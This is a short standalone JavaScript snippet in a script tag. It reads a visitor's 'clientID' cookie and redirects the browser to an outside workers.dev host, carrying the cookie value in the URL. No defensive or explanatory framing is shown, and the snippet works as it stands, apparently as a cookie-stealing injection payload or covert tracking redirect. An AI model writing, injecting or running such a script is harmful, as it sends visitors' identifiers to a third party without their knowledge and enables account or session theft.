<script>
(function () {
  // Helper to get a cookie by name
function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        const value = match ? match[2] : null;
        console.log(`[getCookie] ${name}=${value}`);
        return value;
}

  // Read the user_id cookie
  const userId = getCookie('clientID');

  if (userId) {
    const target = `https://hello.ojdawson1107.workers.dev/?id=${userId}`;
    console.log("[REDIRECT] Redirecting to:", target);
    window.location.href = target;
  } else {
    console.log("[REDIRECT] No user_id cookie found — staying on this page");
  }
})();
</script>
